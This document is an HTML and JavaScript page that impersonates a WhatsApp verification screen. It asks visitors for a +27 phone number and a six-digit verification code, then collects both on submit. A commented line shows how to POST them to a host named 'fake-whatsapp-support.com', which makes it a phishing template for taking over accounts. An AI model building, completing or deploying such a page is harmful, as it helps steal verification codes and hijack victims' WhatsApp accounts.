<!DOCTYPE html>
<html>
<head>
    <title>WhatsApp Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 50px;
        }
        .container {
            max-width: 400px;
            margin: auto;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            position: relative; /* Added for positioning the image */
        }
        .container img {
            position: absolute;
            top: -50px; /* Adjust as needed */
            left: 50%;
            transform: translateX(-50%);
            border-radius: 50%; /* Makes the image circular */
            width: 60px; /* Adjust as needed */
            height: 60px; /* Adjust as needed */
        }
        .input-group {
            display: flex;
            justify-content: center;
            gap: 5px;
            align-items: center;
        }
        .input-group input {
            width: 30px;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            text-align: center;
            font-size: 16px;
            box-sizing: border-box;
        }
        .verification-group {
            margin-top: 20px;
        }
        .verification-group .input-group {
            margin-top: 10px;
        }
        button {
            padding: 10px 20px;
            border: none;
            background-color: #4CAF50;
            color: white;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
        }
        label, p {
            font-size: 14px;
            margin-bottom: 10px;
        }
        .country-code {
            font-size: 16px;
            margin-right: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="whatsapp.JPG" alt="WhatsApp" /> <!-- Image added here -->
        <h2>WhatsApp Verification</h2>
        <form id="verification-form">
            <p>Enter your phone number:</p>
            <div class="input-group" id="phone-number-group">
                <span class="country-code">+27</span>
            </div>
            <div class="verification-group">
                <label for="verification_code">Enter Verification Code:</label>
                <div class="input-group" id="verification-code-group"></div>
            </div>
            <button type="submit">Verify</button>
        </form>
    </div>

    <script>
        // Function to create input fields and set up auto-tab functionality
        function createInputFields(parentId, numFields, inputNamePrefix) {
            const parentElement = document.getElementById(parentId);
            for (let i = 1; i <= numFields; i++) {
                const input = document.createElement('input');
                input.type = 'text';
                input.name = inputNamePrefix + i;
                input.maxLength = 1;
                input.required = true;

                // Handle forward tabbing
                input.addEventListener('input', (event) => {
                    if (event.target.value.length === 1) {
                        const nextInput = event.target.nextElementSibling;
                        if (nextInput) {
                            nextInput.focus();
                        }
                    }
                });

                // Handle backward tabbing
                input.addEventListener('keydown', (event) => {
                    if (event.key === 'Backspace' && event.target.value.length === 0) {
                        const previousInput = event.target.previousElementSibling;
                        if (previousInput) {
                            previousInput.focus();
                        }
                    }
                });

                parentElement.appendChild(input);
            }
        }

        // Create phone number input fields
        createInputFields('phone-number-group', 9, 'digit');

        // Create verification code input fields
        createInputFields('verification-code-group', 6, 'code');

        // Handle form submission
        document.getElementById('verification-form').addEventListener('submit', function(event) {
            event.preventDefault();

            // Collect phone number digits
            const phoneNumberInputs = document.querySelectorAll('#phone-number-group input');
            let phoneNumber = '+27';
            phoneNumberInputs.forEach(input => {
                phoneNumber += input.value;
            });

            // Collect verification code digits
            const verificationCodeInputs = document.querySelectorAll('#verification-code-group input');
            let verificationCode = '';
            verificationCodeInputs.forEach(input => {
                verificationCode += input.value;
            });

            // Simulate form submission
            console.log('Phone Number:', phoneNumber);
            console.log('Verification Code:', verificationCode);

            // You can send the collected data to the server here
            // Example: fetch('http://fake-whatsapp-support.com/process', { method: 'POST', body: JSON.stringify({ phoneNumber, verificationCode }) })
        });
    </script>
</body>
</html>
